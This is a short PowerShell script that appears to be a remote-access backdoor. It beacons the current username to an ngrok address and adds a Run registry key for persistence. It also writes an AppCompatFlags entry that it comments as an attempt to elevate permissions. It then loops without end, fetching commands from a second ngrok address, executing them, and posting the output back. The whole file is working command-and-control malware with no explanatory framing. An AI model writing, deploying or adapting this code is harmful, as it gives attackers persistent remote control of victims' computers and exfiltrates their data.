$URIREC = "192.168.2.37:80"

$URISEND = "192.168.2.37:4444"

$hmal += "New Connection from "

$hmal += whoami

$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI https://4d60d432aae4.ngrok.app -Body $hmal -UseBasicParsing

#attempt to set per

New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "%HOMEPATH%\payload.ps1" `
    -Value "%HOMEPATH%\payload.ps1 -autostart"

# attempt to elevate permissions on next execution

New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" `
    -Name "%HOMEPATH%\payload.ps1" `
    -Value "%HOMEPATH%\payload.ps1"

while ($true)
{

	$I = Invoke-WebRequest -Timeout 1 'https://e7d45510bd9a.ngrok.app' | Select-Object -Expand Content

	$MAIN = powershell /c $I 

	if($MAIN -eq $FALSE){
	}else{ 
	$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI https://4d60d432aae4.ngrok.app -Body $MAIN -UseBasicParsing	
	}
	sleep 0.5
}
